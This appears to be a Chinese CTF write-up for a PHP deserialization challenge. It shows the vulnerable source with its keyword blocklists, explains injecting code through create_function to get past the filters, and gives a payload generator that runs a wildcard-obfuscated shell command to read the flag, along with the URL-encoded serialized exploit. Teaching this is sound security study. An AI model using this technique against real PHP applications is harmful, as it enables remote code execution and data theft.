进入题目环境，可以看到源码：

```php
<?php
class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
        {
            $this->a = $a;
            $this->b = $b;
            $this->check($a,$b);
            eval($a.$b);
        }
    public function __destruct(){
            $a = (string)$this->a;
            $b = (string)$this->b;
            if ($this->check($a,$b)){
                $a("", $b);
            }
            else{
                echo "Try again!";
            }
        }
    private function check($a, $b) {
        $blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
        $blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'flag'];

        $pattern_a = '/' . implode('|', array_map('preg_quote', $blocked_a, ['/'])) . '/i';
        $pattern_b = '/' . implode('|', array_map('preg_quote', $blocked_b, ['/'])) . '/i';

        if (preg_match($pattern_a, $a) || preg_match($pattern_b, $b)) {
            return false;
        }
        return true;
    }  
}


if (isset($_GET['exp'])) {
    $p = unserialize($_GET['exp']);
    var_dump($p);
}else{
    highlight_file("index.php");
}
```

​	注意到存在危险函数eval，但是我们通过反序列化恢复类FLAG时，魔术方法`__construct`并不会触发，所以这个eval没什么用

​	但是`__destruct`魔术方法会触发，我们发现存在这么一个东西

```php
$a("", $b);
```

​	如果`$a`是一个函数，`$b`是一个参数，那么便能进行一个代码命令执行

​	而`$b`是在第二个参数上，可以想到`create_fuction`这么一个函数

​	函数参考[PHP: create_function - Manual](https://www.php.net/manual/zh/function.create-function.php)

```php
create_fuction("$a,$b", "return "ln($a) + ln($b) = " . log($a * $b);")
等价于：
function lambda_1($a,$b){
    return "ln($a) + ln($b) = " . log($a * $b);
}
```

​	而`$a`为`create_fuction`也不会被check

​	那么如果`$b`为`;}phpinfo();/*`

​	那么

```php
$a("", $b);
即为
create_fuction("",";}phpinfo();/*")
等价于
function lambda_1(){
    ;}phpinfo();/*
}
也就是
function lambda_1(){;}
phpinfo();
```

​	可以代码注入，当然`$b`被过滤了许多关键字

​	这里可以使用`var_dump`进行回显，使用反引号执行shell命令，用通配符代替

​	示例：

```php
var_dump(`/usr/bin/nl /?lag`);
改为
var_dump(`/usr/b??/?l /?lag`);
```

​	payload:

```php
<?php
class FLAG
{
        private $a;
        protected $b;
        public function __construct($a, $b)
            {
                $this->a = $a;
                $this->b = $b;
            }
        public function __destruct()
            {
                $a = (string)$this->a;
                $b = (string)$this->b;
            }
}

$exp = new FLAG("create_function", ";}var_dump(`/usr/b??/?l /?lag`);/*");
$exp = serialize($exp);
echo urlencode($exp);

# O%3A4%3A%22FLAG%22%3A2%3A%7Bs%3A7%3A%22%00FLAG%00a%22%3Bs%3A15%3A%22create_function%22%3Bs%3A4%3A%22%00%2A%00b%22%3Bs%3A34%3A%22%3B%7Dvar_dump%28%60%2Fusr%2Fb%3F%3F%2F%3Fl+%2F%3Flag%60%29%3B%2F%2A%22%3B%7D
```

![image-20251123201742393](img/image-20251123201742393.png)